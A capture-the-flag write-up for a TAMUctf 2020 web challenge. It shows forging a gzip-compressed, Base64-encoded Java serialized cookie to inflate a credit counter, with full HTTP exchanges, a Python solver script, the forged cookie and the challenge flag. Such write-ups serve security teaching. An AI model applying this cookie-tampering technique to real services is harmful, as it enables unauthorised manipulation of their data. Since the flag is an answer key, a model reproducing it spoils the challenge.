@@ -1,0 +1,244 @@
+<h1>TAMUctf 2020 – TOO<em>MANY</em>CREDITS_1</h1>
+
+<ul>
+<li><strong>Category:</strong> web</li>
+<li><strong>Points:</strong> 50</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>Okay, fine, there's a lot of credit systems. We had to put that guy on break; seriously concerned about that dude.</p>
+  
+  <p>Anywho. We've made an actually secure one now, with Java, not dirty JS this time. Give it a whack?</p>
+  
+  <p>If you get two thousand million credits again, well, we'll just have to shut this program down.</p>
+  
+  <p>http://toomanycredits.tamuctf.com</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>The website allows you to increment your credits, but you have to get two thousand million credits (or more) in order to get the flag. Obviously, the credit generation can't be bruteforced/automated, because automation countermeasures are in place.</p>
+
+<p>Credits are incremented via HTTP GET.</p>
+
+<p>```
+GET / HTTP/1.1
+Host: toomanycredits.tamuctf.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://toomanycredits.tamuctf.com/
+Cookie: counter="H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA=="
+Upgrade-Insecure-Requests: 1</p>
+
+<p>HTTP/1.1 200 OK
+Server: nginx/1.16.1
+Date: Fri, 20 Mar 2020 12:11:23 GMT
+Content-Type: text/html;charset=UTF-8
+Content-Length: 454
+Connection: close
+Set-Cookie: counter="H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA=="; Version=1; HttpOnly
+Content-Language: it-IT</p>
+
+<p><!DOCTYPE HTML></p>
+
+<p><html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /></p>
+
+<pre><code>&lt;title&gt;Java Credits&lt;/title&gt;
+</code></pre>
+
+<p></head></p>
+
+<p><body></p>
+
+<p><main role="main"></p>
+
+<pre><code>&lt;form&gt;
+    &lt;h2&gt;
+        &lt;span&gt;You have 2 credits.&lt;/span&gt;
+        &lt;span&gt; You haven&amp;#39;t won yet...&lt;/span&gt;
+    &lt;/h2&gt;
+    &lt;button type="submit"&gt;Get More&lt;/button&gt;
+&lt;/form&gt;
+</code></pre>
+
+<p></main>
+</body>
+</html>
+```</p>
+
+<p>There is a strange cookie, called <code>counter</code>, and it seems to be strangely encoded. Analyzing several requests, you can discover that only the last part changes.</p>
+
+<p><code>
+H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA==
+H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==
+H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAKwCppy9lUgAAAA==
+H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAGwAT9ib8UgAAAA==
+H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAOwCFxiGLUgAAAA==
+............................................................................................^^^^^^^^........
+</code></p>
+
+<p>The text says that they are using Java and the Spring logo is present in the favicon.</p>
+
+<p>Furthermore, removing the last part of the cookie will spawn an interesting error.</p>
+
+<p>```
+GET / HTTP/1.1
+Host: toomanycredits.tamuctf.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://toomanycredits.tamuctf.com/
+Cookie: counter="H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/"
+Upgrade-Insecure-Requests: 1</p>
+
+<p>HTTP/1.1 500 Internal Server Error
+Server: nginx/1.16.1
+Date: Fri, 20 Mar 2020 14:20:46 GMT
+Content-Type: text/html;charset=UTF-8
+Content-Length: 333
+Connection: close
+Content-Language: it-IT</p>
+
+<p><html><body><h1>Whitelabel Error Page</h1><p>This application has no explicit mapping for /error, so you are seeing this as a fallback.</p><div id='created'>Fri Mar 20 14:20:46 GMT 2020</div><div>There was an unexpected error (type=Internal Server Error, status=500).</div><div>Unexpected end of ZLIB input stream</div></body></html>
+```</p>
+
+<p>This seems to be a Java serialized object (compressed with GZip and encoded in Base64). So you can write a <a href="too-many-credits-1-solver.py">Python script</a> to discover how the original object is formed.</p>
+
+<p>```
+H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA==
+b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x01'</p>
+
+<p>H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==
+b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x02'</p>
+
+<p>H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAKwCppy9lUgAAAA==
+b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x05'</p>
+
+<p>H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAGwAT9ib8UgAAAA==
+b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x06'</p>
+
+<p>H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAOwCFxiGLUgAAAA==
+b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x07'
+```</p>
+
+<p>The <code>value</code> attribute is at the end as we supposed, so a malicuous payload can easily crafted, e.g.:</p>
+
+<p><code>
+b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xff\xff\xff\xff'
+</code></p>
+
+<p>Using the <a href="too-many-credits-1-solver.py">Python script</a> you can craft the cookie.</p>
+
+<p><code>
+[*] Malicious string is: b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xff\xff\xff\xff'
+[*] Compressed malicious bytes are: b'\x1f\x8b\x08\x00\x0c\xe6t^\x02\xff[\xf3\x96\x81\xb5\xb8\x88A79?W/\xb9(5%\xb3\xa4\x18\x83\xce\xcdOI\xcd\xd1s\x06\xf3\x9c\xf3K\xf3J\x8c8o\x0b\x89p\xaa\xb8310z1\xb0\x96%\xe6\x94\xa6V\x140\x00\xc1\x7f \x00\x00\xc5s\xfe\xcbR\x00\x00\x00'
+[*] Base64 compressed malicious string is: H4sIAAzmdF4C/1vzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMADBfyAAAMVz/stSAAAA
+</code></p>
+
+<p>A <a href="too-many-credits-1-solver.py">Python script</a> can be developed to perform all the reported operations.</p>
+
+<p>```python
+import gzip
+import base64</p>
+
+<p>base64<em>compressed</em>strings = [
+"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA==",
+"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==",
+"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAKwCppy9lUgAAAA==",
+"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAGwAT9ib8UgAAAA==",
+"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAOwCFxiGLUgAAAA=="
+]</p>
+
+<p>for base64<em>compressed</em>string in base64<em>compressed</em>strings:
+    print("[*] Base64 compressed string is: {}".format(base64<em>compressed</em>string))</p>
+
+<pre><code>compressed_bytes = base64.b64decode(base64_compressed_string)
+print("[*] Compressed bytes are: {}".format(compressed_bytes))
+
+original_string = gzip.decompress(compressed_bytes)
+print("[*] Original bytes are: {}".format(original_string))
+
+print()
+</code></pre>
+
+<p>print("    -------\n")</p>
+
+<p>malicious<em>string = b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xff\xff\xff\xff'
+print("[*] Malicious string is: {}".format(malicious</em>string))</p>
+
+<p>compressed<em>malicious</em>bytes = gzip.compress(malicious<em>string)
+print("[*] Compressed malicious bytes are: {}".format(compressed</em>malicious_bytes))</p>
+
+<p>base64<em>compressed</em>malicious<em>string = base64.b64encode(compressed</em>malicious_bytes).decode("ascii")</p>
+
+<p>print("[*] Base64 compressed malicious string is: {}".format(base64<em>compressed</em>malicious_string))
+```</p>
+
+<p>And then performing the request you will get the flag.</p>
+
+<p>```
+GET / HTTP/1.1
+Host: toomanycredits.tamuctf.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://toomanycredits.tamuctf.com/
+Cookie: counter="H4sIAAzmdF4C/1vzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMADBfyAAAMVz/stSAAAA"
+Upgrade-Insecure-Requests: 1</p>
+
+<p>HTTP/1.1 200 OK
+Server: nginx/1.16.1
+Date: Fri, 20 Mar 2020 15:49:46 GMT
+Content-Type: text/html;charset=UTF-8
+Content-Length: 470
+Connection: close
+Set-Cookie: counter="H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMDAwMAIxAwCWeiUoUgAAAA=="; Version=1; HttpOnly
+Content-Language: it-IT</p>
+
+<p><!DOCTYPE HTML></p>
+
+<p><html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /></p>
+
+<pre><code>&lt;title&gt;Java Credits&lt;/title&gt;
+</code></pre>
+
+<p></head></p>
+
+<p><body></p>
+
+<p><main role="main"></p>
+
+<pre><code>&lt;form&gt;
+    &lt;h2&gt;
+        &lt;span&gt;You have 4294967296 credits.&lt;/span&gt;
+        &lt;span&gt; gigem{l0rdy_th15_1s_mAny_cr3d1ts}&lt;/span&gt;
+    &lt;/h2&gt;
+    &lt;button type="submit"&gt;Get More&lt;/button&gt;
+&lt;/form&gt;
+</code></pre>
+
+<p></main>
+</body>
+</html>
+```</p>
+
+<p>The flag is the following.</p>
+
+<p><code>
+gigem{l0rdy_th15_1s_mAny_cr3d1ts}
+</code></p>
